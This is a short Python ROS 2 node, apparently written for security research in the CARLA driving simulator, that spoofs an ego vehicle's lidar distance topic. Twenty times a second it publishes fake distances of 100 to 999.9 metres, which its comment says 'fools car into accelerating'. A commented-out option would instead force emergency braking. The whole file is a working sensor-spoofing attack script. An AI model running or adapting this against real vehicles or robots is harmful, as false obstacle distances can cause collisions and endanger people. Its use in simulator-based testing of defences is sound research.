import rclpy
from rclpy.node import Node
from std_msgs.msg import Float32
import random

class LidarSpoofingAttack(Node):
    def __init__(self):
        super().__init__('lidar_spoofer')

        self.publisher = self.create_publisher(Float32, '/carla/ego_vehicle/lidar_distance', 10)
        self.timer = self.create_timer(0.05, self.publish_fake_distance) 

    def publish_fake_distance(self):
        # Generate a random fake distance: either very close or very far
        spoof_value = random.choice([
            #random.uniform(0.1, 2.0),     # Close (forces emergency braking)
            random.uniform(100, 999.9)  # Very far (fools car into accelerating)
        ])

        msg = Float32()
        msg.data = spoof_value
        self.publisher.publish(msg)
        self.get_logger().info(f"Sent spoofed distance: {spoof_value:.2f}")

def main(args=None):
    rclpy.init(args=args)
    node = LidarSpoofingAttack()

    try:
        rclpy.spin(node)
    except KeyboardInterrupt:
        node.get_logger().info("Shutting down Lidar Spoofer")
    finally:
        node.destroy_node()
        rclpy.shutdown()

if __name__ == '__main__':
    main()
